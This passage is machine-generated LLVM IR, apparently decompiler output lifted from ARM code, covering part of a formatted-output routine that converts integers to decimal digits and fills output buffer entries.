  %v6_1c438 = add i32 %v5_1c438, -1
  %v7_1c438 = inttoptr i32 %v6_1c438 to i8*
  store i8 48, i8* %v7_1c438, align 1
  %v8_1c438 = load i32, i32* %r2.global-to-local, align 4
  %v9_1c438 = add i32 %v8_1c438, -1
  store i32 %v9_1c438, i32* %r2.global-to-local, align 4
  %v0_1c43c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1c470.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1c440

dec_label_pc_1c440:                               ; preds = %bb240, %dec_label_pc_1c430, %dec_label_pc_1c740, %dec_label_pc_1c424
  %v1_1c470 = phi i32 [ %v1_1c3f4, %dec_label_pc_1c424 ], [ %v1_1c3f4, %dec_label_pc_1c740 ], [ %v1_1c470.pre.pre, %bb240 ], [ %v1_1c3f4, %dec_label_pc_1c430 ]
  %v1_1c4e830 = phi i32 [ 0, %dec_label_pc_1c424 ], [ 0, %dec_label_pc_1c740 ], [ %v0_1c43c.pre, %bb240 ], [ %v0_1c430, %dec_label_pc_1c430 ]
  store i32 %v1_1c4e830, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_1c44c = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_1c44c, i32* %r3.global-to-local, align 4
  %v0_1c458 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c458 = inttoptr i32 %v0_1c458 to i8*
  %v2_1c458 = load i8, i8* %v1_1c458, align 1
  %v3_1c458 = zext i8 %v2_1c458 to i32
  store i32 %v3_1c458, i32* %r3.global-to-local, align 4
  %v5_1c458 = add i32 %v0_1c458, 1
  store i32 %v5_1c458, i32* %r2.global-to-local, align 4
  %v1_1c45c = icmp slt i32 %v1_1c4e830, 0
  %v2_1c45c = icmp eq i32 %v1_1c4e830, 0
  store i1 %v2_1c45c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_1c458, i32* %r6.global-to-local, align 4
  store i32 %v3_1c458, i32* %stack_var_-42, align 4
  %v2_1c470 = sub i32 %v1_1c470, %v5_1c458
  store i32 %v2_1c470, i32* %ip.global-to-local, align 4
  br i1 %v1_1c45c, label %.thread, label %dec_label_pc_1c47c

.thread:                                          ; preds = %dec_label_pc_1c440
  %v5_1c474 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_1c474, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c4f8

dec_label_pc_1c47c:                               ; preds = %dec_label_pc_1c440
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1c480 = sub i32 %v1_1c4e830, %v2_1c470
  %v4_1c480 = xor i32 %v2_1c470, %v1_1c4e830
  %v5_1c480 = xor i32 %v2_1c480, %v1_1c4e830
  %v6_1c480 = and i32 %v5_1c480, %v4_1c480
  %v7_1c480 = icmp slt i32 %v6_1c480, 0
  %v8_1c480 = icmp slt i32 %v2_1c480, 0
  %v9_1c480 = icmp eq i32 %v1_1c4e830, %v2_1c470
  store i1 %v9_1c480, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_1c48c = xor i1 %v8_1c480, %v7_1c480
  br i1 %v2_1c48c, label %dec_label_pc_1c4d8, label %dec_label_pc_1c490

dec_label_pc_1c490:                               ; preds = %dec_label_pc_1c47c
  store i32 %v2_1c480, i32* %r2.global-to-local, align 4
  %v2_1c494 = icmp eq i32 %v2_1c480, 0
  store i1 %v2_1c494, i1* %cpsr_z.global-to-local, align 1
  %v2_1c498 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1c498, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_1c480, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_1c4ac

.thread148:                                       ; preds = %dec_label_pc_1c490
  %v7_1c4a0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_1c4a0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_1c4ac:                               ; preds = %dec_label_pc_1c490
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34761), i32* %r3.global-to-local, align 4
  %v2_1c4bc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1c4bc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1c4f8

dec_label_pc_1c4d8:                               ; preds = %dec_label_pc_1c47c
  store i1 %v2_1c45c, i1* %cpsr_z.global-to-local, align 1
  %v2_1c4dc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1c4dc, i32* %lr.global-to-local, align 4
  br i1 %v2_1c45c, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1c4d8
  %v3_1c4e4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_1c4e4, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_1c4d8
  %v3_1c4e8 = sub i32 %v2_1c470, %v1_1c4e830
  store i32 %v3_1c4e8, i32* %ip.global-to-local, align 4
  %v3_1c4ec63 = add i32 %v5_1c458, %v1_1c4e830
  store i32 %v3_1c4ec63, i32* %r6.global-to-local, align 4
  %v3_1c4f0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_1c4f0, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1c538265 = phi i32 [ %v3_1c4e4, %bb242 ], [ %v3_1c4f0, %bb243 ], [ %v7_1c4a0, %.thread148 ]
  %v0_1c50c102 = phi i32 [ %v2_1c470, %bb242 ], [ %v3_1c4e8, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c4f8

dec_label_pc_1c4f8:                               ; preds = %.thread, %dec_label_pc_1c4ac, %.thread34
  %v1_1c538 = phi i32 [ %v2_1c4bc, %dec_label_pc_1c4ac ], [ %v1_1c538265, %.thread34 ], [ %v5_1c474, %.thread ]
  %v0_1c54c109 = phi i32 [ -1, %dec_label_pc_1c4ac ], [ -1, %.thread34 ], [ %v1_1c4e830, %.thread ]
  %v0_1c50c = phi i32 [ 0, %dec_label_pc_1c4ac ], [ %v0_1c50c102, %.thread34 ], [ %v2_1c470, %.thread ]
  %v3_1c4f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c4f8, i32* %r2.global-to-local, align 4
  %v1_1c4fc = add i32 %v3_1c4f8, 12
  %v2_1c4fc = inttoptr i32 %v1_1c4fc to i32*
  %v3_1c4fc = load i32, i32* %v2_1c4fc, align 4
  %v1_1c500 = and i32 %v3_1c4fc, 16
  store i32 %v1_1c500, i32* %r4.global-to-local, align 4
  %v2_1c500 = icmp eq i32 %v1_1c500, 0
  %tmp270 = zext i1 %v2_1c500 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_1c50c = icmp eq i32 %v0_1c50c, 0
  store i1 %v2_1c50c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c50c, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1c4f8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1c528

bb246:                                            ; preds = %dec_label_pc_1c4f8
  store i1 %v2_1c500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c500, label %dec_label_pc_1c51c, label %dec_label_pc_1c528

dec_label_pc_1c51c:                               ; preds = %bb246
  %v0_1c51c = load i32, i32* %sb.global-to-local, align 4
  %v7_1c51c = icmp eq i32 %v0_1c51c, 103
  store i1 %v7_1c51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c51c, label %dec_label_pc_1c54c, label %bb247

bb247:                                            ; preds = %dec_label_pc_1c51c
  %v1_1c520 = load i32, i32* %fp.global-to-local, align 4
  %v3_1c520 = icmp eq i32 %v1_1c520, 0
  store i1 %v3_1c520, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_1c520, 1
  br i1 %tmp248, label %dec_label_pc_1c54c, label %dec_label_pc_1c528

dec_label_pc_1c528:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34764), i32* %r3.global-to-local, align 4
  %v2_1c538 = inttoptr i32 %v1_1c538 to i32*
  store i32 112, i32* %v2_1c538, align 4
  %v0_1c53c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c53c = add i32 %v0_1c53c, 16
  store i32 %v1_1c53c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1c544 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c544 = add i32 %v0_1c544, 4
  %v2_1c544 = inttoptr i32 %v1_1c544 to i32*
  store i32 1, i32* %v2_1c544, align 4
  %v4_1c544 = add i32 %v0_1c544, 8
  %v5_1c544 = inttoptr i32 %v4_1c544 to i32*
  %v6_1c544 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1c544, i32* %v5_1c544, align 4
  %v0_1c548 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c548 = add i32 %v0_1c548, 12
  store i32 %v1_1c548, i32* %r7.global-to-local, align 4
  %v0_1c54c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c54c

dec_label_pc_1c54c:                               ; preds = %dec_label_pc_1c51c, %bb247, %dec_label_pc_1c528
  %v1_1c56c = phi i32 [ %v1_1c538, %bb247 ], [ %v1_1c548, %dec_label_pc_1c528 ], [ %v1_1c538, %dec_label_pc_1c51c ]
  %v0_1c54c = phi i32 [ %v0_1c54c109, %bb247 ], [ %v0_1c54c.pre, %dec_label_pc_1c528 ], [ %v0_1c54c109, %dec_label_pc_1c51c ]
  %v1_1c54c = add i32 %v0_1c54c, 1
  store i32 %v1_1c54c, i32* %lr.global-to-local, align 4
  %v6_1c54c = icmp slt i32 %v1_1c54c, 0
  %v7_1c54c = icmp eq i32 %v1_1c54c, 0
  store i1 %v7_1c54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_1c54c, label %dec_label_pc_1c554, label %dec_label_pc_1c578

dec_label_pc_1c554:                               ; preds = %dec_label_pc_1c54c
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34761), i32* %r3.global-to-local, align 4
  %v1_1c564 = sub i32 -1, %v0_1c54c
  store i32 %v1_1c564, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1c56c = inttoptr i32 %v1_1c56c to i32*
  store i32 176, i32* %v2_1c56c, align 4
  %v0_1c570 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c570 = add i32 %v0_1c570, 4
  %v2_1c570 = inttoptr i32 %v1_1c570 to i32*
  %v3_1c570 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1c570, i32* %v2_1c570, align 4
  %v4_1c570 = add i32 %v0_1c570, 8
  %v5_1c570 = inttoptr i32 %v4_1c570 to i32*
  %v6_1c570 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1c570, i32* %v5_1c570, align 4
  %v0_1c574 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c574 = add i32 %v0_1c574, 12
  store i32 %v1_1c574, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c578

dec_label_pc_1c578:                               ; preds = %dec_label_pc_1c54c, %dec_label_pc_1c554
  %v2_1c580 = phi i32 [ %v1_1c56c, %dec_label_pc_1c54c ], [ %v1_1c574, %dec_label_pc_1c554 ]
  %v0_1c578 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c578 = icmp eq i32 %v0_1c578, 0
  store i1 %v2_1c578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c578, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1c578
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1c580 = inttoptr i32 %v2_1c580 to i32*
  store i32 112, i32* %v3_1c580, align 4
  %v1_1c584 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c584 = load i32, i32* %r7.global-to-local, align 4
  %v3_1c584 = add i32 %v2_1c584, 8
  %v4_1c584 = inttoptr i32 %v3_1c584 to i32*
  store i32 %v1_1c584, i32* %v4_1c584, align 4
  %v1_1c588 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c588 = load i32, i32* %r7.global-to-local, align 4
  %v3_1c588 = add i32 %v2_1c588, 4
  %v4_1c588 = inttoptr i32 %v3_1c588 to i32*
  store i32 %v1_1c588, i32* %v4_1c588, align 4
  %v1_1c58c = load i32, i32* %r7.global-to-local, align 4
  %v2_1c58c = add i32 %v1_1c58c, 12
  store i32 %v2_1c58c, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1c578, %bb249
  %v1_1c5c4 = phi i32 [ %v2_1c580, %dec_label_pc_1c578 ], [ %v2_1c58c, %bb249 ]
  %v0_1c590 = load i32, i32* %sb.global-to-local, align 4
  %v7_1c590 = icmp eq i32 %v0_1c590, 103
  store i1 %v7_1c590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c590, label %dec_label_pc_1c598, label %dec_label_pc_1c5a0

dec_label_pc_1c598:                               ; preds = %.thread46
  %v0_1c598 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c598 = icmp eq i32 %v0_1c598, 0
  store i1 %v2_1c598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c598, label %dec_label_pc_1c5d0, label %dec_label_pc_1c5a0

dec_label_pc_1c5a0:                               ; preds = %.thread46, %dec_label_pc_1c598
  %v0_1c5a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c5a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c5a0 = sub i32 %v1_1c5a0, %v0_1c5a0
  store i32 %v2_1c5a0, i32* %r1.global-to-local, align 4
  %v1_1c5a4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c5a4 = sub i32 %v2_1c5a0, %v1_1c5a4
  %v4_1c5a4 = xor i32 %v1_1c5a4, %v2_1c5a0
  %v5_1c5a4 = xor i32 %v2_1c5a4, %v2_1c5a0
  %v6_1c5a4 = and i32 %v5_1c5a4, %v4_1c5a4
  %v7_1c5a4 = icmp slt i32 %v6_1c5a4, 0
  %v8_1c5a4 = icmp slt i32 %v2_1c5a4, 0
  %v9_1c5a4 = icmp eq i32 %v2_1c5a0, %v1_1c5a4
  store i1 %v9_1c5a4, i1* %cpsr_z.global-to-local, align 1
  %v2_1c5a8 = xor i1 %v8_1c5a4, %v7_1c5a4
  br i1 %v2_1c5a8, label %dec_label_pc_1c5ac, label %dec_label_pc_1c5d0

dec_label_pc_1c5ac:                               ; preds = %dec_label_pc_1c5a0
  %v2_1c5b8 = sub i32 %v1_1c5a4, %v2_1c5a0
  store i32 %v2_1c5b8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34761), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1c5c4 = inttoptr i32 %v1_1c5c4 to i32*
  store i32 176, i32* %v2_1c5c4, align 4
  %v0_1c5c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c5c8 = add i32 %v0_1c5c8, 4
  %v2_1c5c8 = inttoptr i32 %v1_1c5c8 to i32*
  %v3_1c5c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1c5c8, i32* %v2_1c5c8, align 4
  %v4_1c5c8 = add i32 %v0_1c5c8, 8
  %v5_1c5c8 = inttoptr i32 %v4_1c5c8 to i32*
  %v6_1c5c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1c5c8, i32* %v5_1c5c8, align 4
  %v0_1c5cc = load i32, i32* %r7.global-to-local, align 4
  %v1_1c5cc = add i32 %v0_1c5cc, 12
  store i32 %v1_1c5cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c5d0

dec_label_pc_1c5d0:                               ; preds = %dec_label_pc_1c5a0, %dec_label_pc_1c598, %dec_label_pc_1c5ac
  %v1_1c664.pre.pre = phi i32 [ %v1_1c5c4, %dec_label_pc_1c5a0 ], [ %v1_1c5c4, %dec_label_pc_1c598 ], [ %v1_1c5cc, %dec_label_pc_1c5ac ]
  %v0_1c5d0 = load i32, i32* %r8.global-to-local, align 4
  %v7_1c5d0 = icmp eq i32 %v0_1c5d0, 102
  store i1 %v7_1c5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c5d0, label %dec_label_pc_1c658, label %dec_label_pc_1c5d8

dec_label_pc_1c5d8:                               ; preds = %dec_label_pc_1c5d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1c5dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1c5dc = icmp slt i32 %v0_1c5dc, 0
  %v2_1c5dc = icmp eq i32 %v0_1c5dc, 0
  store i1 %v2_1c5dc, i1* %cpsr_z.global-to-local, align 1
  %v4_1c5e0 = select i1 %tmp275, i32 %v4_1c2fc126130, i32 101
  store i32 %v4_1c5e0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_1c5f0 = sub i32 0, %v0_1c5dc
  %storemerge158 = select i1 %v1_1c5dc, i32 %v4_1c5f0, i32 %v0_1c5dc
  %tmp271 = ashr i32 %v0_1c5dc, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1c5f8 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1c5f8, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c600

dec_label_pc_1c600:                               ; preds = %dec_label_pc_1c630, %dec_label_pc_1c600, %dec_label_pc_1c5d8
  %v2_1c618 = phi i32 [ %v2_1c5f8, %dec_label_pc_1c5d8 ], [ %v6_1c618, %dec_label_pc_1c600 ], [ %v6_1c618, %dec_label_pc_1c630 ]
  %v0_1c610 = phi i32 [ %storemerge158, %dec_label_pc_1c5d8 ], [ %v2_1c61c, %dec_label_pc_1c600 ], [ %v2_1c61c, %dec_label_pc_1c630 ]
  %v3_1c608 = urem i32 %v0_1c610, 10
  %v1_1c60c = or i32 %v3_1c608, 48
  store i32 %v1_1c60c, i32* %r3.global-to-local, align 4
  store i32 %v0_1c610, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1c618 = trunc i32 %v1_1c60c to i8
  %v3_1c618 = add i32 %v2_1c618, -1
  %v4_1c618 = inttoptr i32 %v3_1c618 to i8*
  store i8 %v1_1c618, i8* %v4_1c618, align 1
  %v5_1c618 = load i32, i32* %r6.global-to-local, align 4
  %v6_1c618 = add i32 %v5_1c618, -1
  store i32 %v6_1c618, i32* %r6.global-to-local, align 4
  %v0_1c61c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c61c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c61c = sdiv i32 %v0_1c61c, %v1_1c61c
  store i32 %v2_1c61c, i32* %r0.global-to-local, align 4
  %v0_1c620 = load i32, i32* %r8.global-to-local, align 4
  %v1_1c620 = add i32 %v0_1c620, 1
  store i32 %v1_1c620, i32* %r8.global-to-local, align 4
  %v7_1c624 = icmp eq i32 %v1_1c620, 3
  store i1 %v7_1c624, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1c61c, i32* %r5.global-to-local, align 4
  br i1 %v7_1c624, label %dec_label_pc_1c600, label %dec_label_pc_1c630

dec_label_pc_1c630:                               ; preds = %dec_label_pc_1c600
  %v2_1c630 = icmp eq i32 %v2_1c61c, 0
  store i1 %v2_1c630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c630, label %dec_label_pc_1c638, label %dec_label_pc_1c600

dec_label_pc_1c638:                               ; preds = %dec_label_pc_1c630
  %v1_1c638 = add i32 %v5_1c618, -2
  store i32 %v1_1c638, i32* %r3.global-to-local, align 4
  %v0_1c63c = load i32, i32* %sl.global-to-local, align 4
  %v1_1c63c = trunc i32 %v0_1c63c to i8
  %v4_1c63c = inttoptr i32 %v1_1c638 to i8*
  store i8 %v1_1c63c, i8* %v4_1c63c, align 1
  %v0_1c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c640 = add i32 %v0_1c640, -1
  store i32 %v1_1c640, i32* %r2.global-to-local, align 4
  %v0_1c644 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c644 = trunc i32 %v0_1c644 to i8
  %v4_1c644 = inttoptr i32 %v1_1c640 to i8*
  store i8 %v1_1c644, i8* %v4_1c644, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1c64c = load i32, i32* %r7.global-to-local, align 4
  %v1_1c64c = inttoptr i32 %v0_1c64c to i32*
  store i32 112, i32* %v1_1c64c, align 4
  %v3_1c64c = add i32 %v0_1c64c, 4
  %v4_1c64c = inttoptr i32 %v3_1c64c to i32*
  %v5_1c64c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_1c64c, i32* %v4_1c64c, align 4
  %v0_1c650 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c650 = load i32, i32* %r7.global-to-local, align 4
  %v2_1c650 = add i32 %v1_1c650, 8
  %v3_1c650 = inttoptr i32 %v2_1c650 to i32*
  store i32 %v0_1c650, i32* %v3_1c650, align 4
  %v0_1c654 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c654 = add i32 %v0_1c654, 12
  store i32 %v1_1c654, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c658

dec_label_pc_1c658:                               ; preds = %dec_label_pc_1c5d0, %.thread124, %dec_label_pc_1c638
  %v1_1c664.pre = phi i32 [ %v2_1c130, %.thread124 ], [ %v1_1c654, %dec_label_pc_1c638 ], [ %v1_1c664.pre.pre, %dec_label_pc_1c5d0 ]
  %v2_1c658 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1c658, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c65c

dec_label_pc_1c65c:                               ; preds = %dec_label_pc_1c65c, %dec_label_pc_1c658
  %v0_1c65c = phi i32 [ %v2_1c658, %dec_label_pc_1c658 ], [ %v4_1c65c, %dec_label_pc_1c65c ]
  %stack_var_-188.0 = phi i32 [ %v3_1bfcc, %dec_label_pc_1c658 ], [ %v2_1c668, %dec_label_pc_1c65c ]
  %v1_1c65c = inttoptr i32 %v0_1c65c to i32*
  %v2_1c65c = load i32, i32* %v1_1c65c, align 4
  store i32 %v2_1c65c, i32* %r3.global-to-local, align 4
  %v4_1c65c = add i32 %v0_1c65c, 12
  store i32 %v4_1c65c, i32* %r2.global-to-local, align 4
  %v3_1c664 = icmp ult i32 %v4_1c65c, %v1_1c664.pre
  %v2_1c668 = sub i32 %stack_var_-188.0, %v2_1c65c
  store i32 %v2_1c668, i32* %ip.global-to-local, align 4
  br i1 %v3_1c664, label %dec_label_pc_1c65c, label %dec_label_pc_1c674

dec_label_pc_1c674:                               ; preds = %dec_label_pc_1c65c
  %v3_1c674 = load i8, i8* %stack_var_-46, align 1
  %v4_1c674 = sext i8 %v3_1c674 to i32
  store i32 %v4_1c674, i32* %r3.global-to-local, align 4
  store i32 %v4_1c674, i32* %r2.global-to-local, align 4
  %v2_1c678 = icmp eq i8 %v3_1c674, 0
  store i1 %v2_1c678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c678, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_1c674
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_1c674, %bb253
  %v1_1c6d8 = phi i32 [ %v4_1c674, %dec_label_pc_1c674 ], [ 1, %bb253 ]
  %v2_1c680 = sub i32 %v2_1c668, %v1_1c6d8
  store i32 %v2_1c680, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1c688 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1c688, i32* %r3.global-to-local, align 4
  %v2_1c68c = icmp eq i32 %v2_1c680, 0
  store i1 %v2_1c68c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_1c680, 1
  br i1 %tmp255, label %dec_label_pc_1c6f4, label %dec_label_pc_1c6a0

dec_label_pc_1c6a0:                               ; preds = %bb254
  %v3_1c6a0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c6a0, i32* %lr.global-to-local, align 4
  %v1_1c6a4 = add i32 %v3_1c6a0, 12
  %v2_1c6a4 = inttoptr i32 %v1_1c6a4 to i32*
  %v3_1c6a4 = load i32, i32* %v2_1c6a4, align 4
  store i32 %v3_1c6a4, i32* %r3.global-to-local, align 4
  %v1_1c6a8 = and i32 %v3_1c6a4, 8
  %v2_1c6a8 = icmp eq i32 %v1_1c6a8, 0
  store i1 %v2_1c6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c6a8, label %dec_label_pc_1c6cc, label %dec_label_pc_1c6b0

dec_label_pc_1c6b0:                               ; preds = %dec_label_pc_1c6a0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34761), i32* %r3.global-to-local, align 4
  %v1_1c6c0 = add i32 %v1_1c664.pre, 12
  store i32 %v1_1c6c0, i32* %r6.global-to-local, align 4
  %v1_1c6c4 = inttoptr i32 %v1_1c664.pre to i32*
  store i32 160, i32* %v1_1c6c4, align 4
  %v3_1c6c4 = add i32 %v1_1c664.pre, 4
  %v4_1c6c4 = inttoptr i32 %v3_1c6c4 to i32*
  %v5_1c6c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6c4, i32* %v4_1c6c4, align 4
  %v6_1c6c4 = add i32 %v1_1c664.pre, 8
  %v7_1c6c4 = inttoptr i32 %v6_1c6c4 to i32*
  %v8_1c6c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1c6c4, i32* %v7_1c6c4, align 4
  br label %dec_label_pc_1c6f8

dec_label_pc_1c6cc:                               ; preds = %dec_label_pc_1c6a0
  store i32 %v3_1c6a0, i32* %ip.global-to-local, align 4
  %v1_1c6d0 = add i32 %v3_1c6a0, 16
  %v2_1c6d0 = inttoptr i32 %v1_1c6d0 to i32*
  %v3_1c6d0 = load i32, i32* %v2_1c6d0, align 4
  store i32 %v3_1c6d0, i32* %r3.global-to-local, align 4
  %v7_1c6d4 = icmp eq i32 %v3_1c6d0, 48
  store i1 %v7_1c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c6d4, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_1c6cc
  store i32 %v2_1c668, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c6f4

.thread54.thread70:                               ; preds = %dec_label_pc_1c6cc
  %v4_1c6e0 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_1c664.pre, i32* %r6.global-to-local, align 4
  %v3_1c6e8 = add i32 %v4_1c6e0, %v2_1c680
  store i32 %v3_1c6e8, i32* %r3.global-to-local, align 4
  store i32 %v3_1c6e8, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1c6f8

dec_label_pc_1c6f4:                               ; preds = %bb256, %bb254
  store i32 %v1_1c664.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c6f8

dec_label_pc_1c6f8:                               ; preds = %.thread54.thread70, %dec_label_pc_1c6b0, %dec_label_pc_1c6f4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1c6fc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1c6fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c700

dec_label_pc_1c700:                               ; preds = %dec_label_pc_1c728, %dec_label_pc_1c6f8
  %v0_1c700 = phi i32 [ %v1_1c71c, %dec_label_pc_1c728 ], [ %v2_1c6fc, %dec_label_pc_1c6f8 ]
  %v1_1c700 = inttoptr i32 %v0_1c700 to i32*
  %v2_1c700 = load i32, i32* %v1_1c700, align 4
  store i32 %v2_1c700, i32* %r1.global-to-local, align 4
  %v3_1c700 = add i32 %v0_1c700, 4
  %v4_1c700 = inttoptr i32 %v3_1c700 to i32*
  %v5_1c700 = load i32, i32* %v4_1c700, align 4
  store i32 %v5_1c700, i32* %r2.global-to-local, align 4
  %v6_1c700 = add i32 %v0_1c700, 8
  %v7_1c700 = inttoptr i32 %v6_1c700 to i32*
  %v8_1c700 = load i32, i32* %v7_1c700, align 4
  store i32 %v8_1c700, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 116500, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_1c714 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c714 = add i32 %v0_1c714, 4
  %v2_1c714 = inttoptr i32 %v1_1c714 to i32*
  %v3_1c714 = load i32, i32* %v2_1c714, align 4
  store i32 %v3_1c714, i32* %r3.global-to-local, align 4
  %v0_1c718 = load i32, i32* %r0.global-to-local, align 4
